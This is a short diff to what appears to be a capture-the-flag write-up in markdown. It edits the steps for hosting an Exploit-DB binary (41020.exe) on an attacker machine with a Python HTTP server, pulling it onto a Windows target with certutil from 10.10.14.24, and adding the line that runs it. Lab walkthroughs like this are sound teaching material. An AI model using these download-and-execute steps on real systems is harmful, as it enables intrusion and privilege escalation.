@@ -90,13 +90,9 @@ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sp
 sudo python3 -m http.server
 
 # On the target machine:
-cd c:\Users\Public\Downloads
-
 certutil.exe -urlcache -split -f "http://10.10.14.24:8000/41020.exe" 41020.exe
 
-
-
-
+41020.exe
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d51b7047-a7a0-4610-90a0-f28a43dbaa68)
